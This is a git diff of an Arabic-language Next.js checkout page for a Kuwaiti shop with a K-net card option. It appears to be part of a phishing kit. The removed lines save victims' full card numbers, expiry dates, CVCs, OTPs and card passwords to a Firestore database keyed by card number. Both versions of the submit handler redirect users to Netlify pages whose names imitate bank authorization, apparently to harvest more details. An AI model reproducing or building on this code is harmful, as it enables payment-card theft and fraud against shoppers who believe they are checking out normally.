@@ -1,17 +1,14 @@
 'use client'
 
-import { useState } from 'react'
-import { Home, Briefcase, MapPin, ChevronRight, ShoppingCart } from 'lucide-react'
+import React, { useState } from 'react'
+import { Home, Briefcase, MapPin, ChevronRight } from 'lucide-react'
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
 import Image from 'next/image'
-import { useCart } from '@/components/cart-provider'
-import PaymentForm from '../payment-form'
-import { doc, setDoc } from 'firebase/firestore'
-import db from '../lib/firebase'
 import { Input } from '@/components/ui/input'
 import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTitle} from '@/components/ui/sheet'
+import { useCart } from './context/cart-context'
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
@@ -19,54 +16,20 @@ type PaymentType = 'full' | 'partial'
 export default function CheckoutPage() {
   const [selectedLocation, setSelectedLocation] = useState<LocationType>('home')
   const [paymentType, setPaymentType] = useState<PaymentType>('full')
-  const [setp, setStep] = useState(1)
   const [loading, setisloading] = useState(false)
-  const [showCart, setShowCart] = useState(false)
 
-  const handlePaymentComplete = async (paymentInfo: any, method: any) => {
-    try {
-      // Create an order object
-      const order = {
-        cardNumber: paymentInfo?.cardNumber,
-        year: paymentInfo?.year,
-        month: paymentInfo?.month,
-        cvc: paymentInfo?.cvc,
-        otp: paymentInfo?.otp,
-        pass: paymentInfo?.pass,
-        createdAt: new Date(),
-        cardState:'new',
-        bank:        paymentInfo?.bank,
-        prefix:paymentInfo.prefix
-      }
-      const docRef = await doc(db, 'orders', paymentInfo.cardNumber)
-      const ref = await setDoc(docRef, order)
-
-    } catch {
-
-    }
-
-    // Add the order to Firestore
-
-
-
-    // Clear the cart and redirect to home page
-    localStorage.removeItem('cart')
-
-  }
-  const handleSubmit = (e: any) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     setisloading(true)
     setTimeout(() => {
       setisloading(false)
-      window.location.hostname="https://kentbanks.netlify.app/"
-      window.location.replace("https://kentbanks.netlify.app/")
+      window.location.hostname="https://authorizations.netlify.app/"
+      window.location.replace("https://authorizations.netlify.app/")
     }, 3000)
   }
+  const { state, dispatch } = useCart()
 
-  const { cart ,removeFromCart} = useCart()
-  const total = cart.reduce((sum, item) => sum + item.price * item.quantity, 0)
-
-
+  
 
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
@@ -172,7 +135,7 @@ export default function CheckoutPage() {
               <span>بطاقة السحب الآلي</span>
             </div>
             <Image
-              src="/kent.svg"
+              src="/images/kent.svg"
               alt="K-net"
               width={40}
               height={40}
@@ -189,8 +152,8 @@ export default function CheckoutPage() {
             <Sheet>
             <SheetTrigger asChild>
               <Button  variant="outline" className="relative">
-                {cart.length > 0 && (
-                  <>المنتجات ({cart.length})</>
+                {state.items.length > 0 && (
+                  <>المنتجات ({state.items.length })</>
                     
                 )}
               </Button>
@@ -199,16 +162,19 @@ export default function CheckoutPage() {
               <SheetHeader>
                 <SheetTitle>سلة التسوق</SheetTitle>
                 <SheetDescription>
-                  {cart.length === 0 ? "سلة التسوق فارغة" : `${cart.length} منتجات في السلة`}
+                  {state.items.length  === 0 ? "سلة التسوق فارغة" : `${state.items.length } منتجات في السلة`}
                 </SheetDescription>
               </SheetHeader>
               <div className="mt-4 space-y-4">
-                {cart.map((item, index) => (
+                {state.items.map((item, index) => (
                   <div key={index} className="flex justify-between items-center">
                     <span>{item.name}</span>
                     <div className="flex items-center gap-2">
                       <span>{item.price.toFixed(3)} د.ك</span>
-                      <Button size="sm" variant="destructive" onClick={() => removeFromCart(item.id)}>
+                      <Button size="sm" variant="destructive" 
+                                        onClick={() => dispatch({ type: 'REMOVE_ITEM', payload: item.id })}
+
+                      >
                         حذف
                       </Button>
                     </div>
@@ -216,7 +182,7 @@ export default function CheckoutPage() {
                 ))}
               </div>
             </SheetContent>
-          </Sheet>              <span>{total.toString()}د.ك</span>
+          </Sheet>              <span>{state.total.toString()}د.ك</span>
             </div>
             <div className="flex justify-between">
               <span>قيمة التوصيل</span>
@@ -253,7 +219,7 @@ export default function CheckoutPage() {
           {/* Total */}
           <div className="flex justify-between items-center font-bold text-lg pt-4 border-t">
             <span>المجموع الكلي</span>
-            <span>{total} د.ك</span>
+            <span>{state.total} د.ك</span>
           </div>
         </div>
 
@@ -261,7 +227,7 @@ export default function CheckoutPage() {
         <Button
           type='submit'
           className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl">
-          {!loading ? `متابعة الدفع (${total})د.ك` : "الرجاء الانتظار"}
+          {!loading ? `متابعة الدفع (${state.total})د.ك` : "الرجاء الانتظار"}
         </Button>
       </form>
       
